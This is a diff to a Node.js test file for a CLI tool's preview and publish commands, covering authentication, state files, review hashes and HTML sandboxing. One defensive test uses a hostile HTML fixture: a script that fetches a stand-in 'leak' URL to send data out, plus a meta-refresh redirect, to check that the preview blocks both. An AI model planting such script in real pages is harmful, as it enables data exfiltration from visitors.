@@ -1,10 +1,12 @@
 import assert from "node:assert/strict";
-import { chmod, mkdtemp, mkdir, readFile, writeFile } from "node:fs/promises";
+import { chmod, mkdtemp, mkdir, readFile, readdir, realpath, symlink, writeFile } from "node:fs/promises";
 import { createServer } from "node:http";
 import { once } from "node:events";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import test from "node:test";
+import { createHash } from "node:crypto";
+import { createBrowserPreview } from "../src/preview.js";
 import { collectToken, configDir, detectAgents, installSkills, main, npmProcess, presentError, renderFile } from "../src/cli.js";
 import { APIError } from "../src/client.js";
 
@@ -135,6 +137,101 @@ test("validates a publish file before authentication", async () => {
       ["OPENARTIFACTS_API_HOST", previous.host],
       ["OPENARTIFACTS_TOKEN", previous.token],
     ]) value === undefined ? delete process.env[name] : process.env[name] = value;
+  }
+});
+
+test("preview is unauthenticated, leaves config untouched, and matches create and update HTML", async (t) => {
+  const directory = await mkdtemp(join(tmpdir(), "openartifacts-preview-"));
+  const config = join(directory, "config");
+  const markdown = join(directory, "notes.md");
+  const alias = join(directory, "alias.md");
+  const html = join(directory, "page.html");
+  const htmlSource = '<!doctype html><style>p::before{content:"\\00b7"}</style><p>Kept</p>';
+  await writeFile(markdown, "# Heading\n\nHello **world**.");
+  await symlink(markdown, alias);
+  await writeFile(html, htmlSource);
+  const variables = ["OPENARTIFACTS_CONFIG_DIR", "OPENARTIFACTS_API_HOST", "OPENARTIFACTS_TOKEN"];
+  const previous = Object.fromEntries(variables.map((name) => [name, process.env[name]]));
+  process.env.OPENARTIFACTS_CONFIG_DIR = config;
+  process.env.OPENARTIFACTS_API_HOST = "https://preview-test.invalid";
+  delete process.env.OPENARTIFACTS_TOKEN;
+  const requests = [];
+  t.mock.method(globalThis, "fetch", async (url, init) => {
+    requests.push({ url, ...init });
+    return Response.json({ docId: "preview-test", url: "https://example.test/d/preview-test" });
+  });
+  t.mock.method(console, "log", () => {});
+  async function preview(file) {
+    let output = "";
+    const stdout = t.mock.method(process.stdout, "write", (chunk) => { output += chunk; return true; });
+    try {
+      await main(["preview", file]);
+      return output;
+    } finally {
+      stdout.mock.restore();
+    }
+  }
+  try {
+    // Resolving the alias must use the same title and content as publishing it.
+    const rendered = await preview(alias);
+    const uploadHtml = await renderFile(markdown);
+    assert.equal(rendered, createBrowserPreview(uploadHtml));
+    assert.equal(await preview(html), createBrowserPreview(htmlSource));
+    assert.equal(requests.length, 0);
+    await assert.rejects(readdir(config), { code: "ENOENT" });
+
+    // Even invalid stored credentials are irrelevant to this local operation.
+    await mkdir(config);
+    await writeFile(join(config, "credentials.json"), "invalid credentials JSON");
+    await writeFile(join(config, "state.json"), '{"files":{}}');
+    assert.equal(await preview(alias), rendered);
+    assert.equal(await readFile(join(config, "credentials.json"), "utf8"), "invalid credentials JSON");
+    assert.equal(await readFile(join(config, "state.json"), "utf8"), '{"files":{}}');
+    assert.deepEqual((await readdir(config)).sort(), ["credentials.json", "state.json"]);
+    assert.equal(requests.length, 0);
+
+    process.env.OPENARTIFACTS_TOKEN = "test-token";
+    const hash = createHash("sha256").update(uploadHtml).digest("hex");
+    await writeFile(markdown, "Changed after review");
+    await assert.rejects(main(["publish", alias, "--reviewed-sha256", hash]), /changed after review/);
+    assert.equal(requests.length, 0);
+    await writeFile(markdown, "# Heading\n\nHello **world**.");
+    await main(["publish", alias, "--reviewed-sha256", hash]);
+    await main(["publish", markdown]);
+    await main(["publish", html]);
+    assert.deepEqual(requests.map((request) => request.method), ["POST", "PUT", "POST"]);
+    assert.deepEqual(requests.map((request) => JSON.parse(request.body).html), [uploadHtml, uploadHtml, htmlSource]);
+    const state = JSON.parse(await readFile(join(config, "state.json"), "utf8"));
+    assert.deepEqual(Object.keys(state.files).sort(), [
+      `https://preview-test.invalid\n${await realpath(markdown)}`,
+      `https://preview-test.invalid\n${await realpath(html)}`,
+    ].sort());
+  } finally {
+    for (const [name, value] of Object.entries(previous)) {
+      value === undefined ? delete process.env[name] : process.env[name] = value;
+    }
+  }
+});
+
+test("preview rejects invalid arguments and inputs without authentication or state writes", async (t) => {
+  const directory = await mkdtemp(join(tmpdir(), "openartifacts-preview-invalid-"));
+  const unsupported = join(directory, "notes.txt");
+  await writeFile(unsupported, "unsupported");
+  const config = process.env.OPENARTIFACTS_CONFIG_DIR;
+  const token = process.env.OPENARTIFACTS_TOKEN;
+  process.env.OPENARTIFACTS_CONFIG_DIR = join(directory, "config");
+  delete process.env.OPENARTIFACTS_TOKEN;
+  const fetch = t.mock.method(globalThis, "fetch", () => { throw new Error("Unexpected network access"); });
+  try {
+    await assert.rejects(main(["preview"]), /Usage: openartifacts/);
+    await assert.rejects(main(["preview", unsupported, "extra"]), /Usage: openartifacts/);
+    await assert.rejects(main(["preview", unsupported]), /Markdown.*or HTML/);
+    await assert.rejects(main(["preview", join(directory, "missing.md")]), { code: "ENOENT" });
+    assert.equal(fetch.mock.callCount(), 0);
+    await assert.rejects(readdir(process.env.OPENARTIFACTS_CONFIG_DIR), { code: "ENOENT" });
+  } finally {
+    config === undefined ? delete process.env.OPENARTIFACTS_CONFIG_DIR : process.env.OPENARTIFACTS_CONFIG_DIR = config;
+    token === undefined ? delete process.env.OPENARTIFACTS_TOKEN : process.env.OPENARTIFACTS_TOKEN = token;
   }
 });
 
@@ -316,4 +413,20 @@ test("a stale publish mapping requires explicit replacement", async () => {
     remote.server.close();
   }
   assert.deepEqual(remote.methods, ["POST", "PUT", "DELETE", "POST"]);
+});
+
+
+test("protected preview keeps hostile source out of the trusted shell", () => {
+  const source = '<script>fetch("https://example.invalid/leak")</script><meta http-equiv="refresh" content="0;url=https://example.invalid"><p>Note</p>';
+  const preview = createBrowserPreview(source);
+  assert.equal((preview.match(/<script>/g) ?? []).length, 1);
+  assert.equal((preview.match(/<\/script>/g) ?? []).length, 1);
+  assert.match(preview, /role="note">Static preview: scripts, embedded frames, external resources, and navigation are disabled here/);
+  assert.match(preview, /published page keeps the original HTML and may behave differently/);
+  assert.match(preview, /sandbox="allow-same-origin"/);
+  assert.doesNotMatch(preview, /sandbox="allow-scripts"/);
+  assert.match(preview, /script-src 'none'/);
+  assert.match(preview, /connect-src 'none'/);
+  assert.match(preview, /frame-src 'none'/);
+  assert.ok(!preview.includes(source));
 });
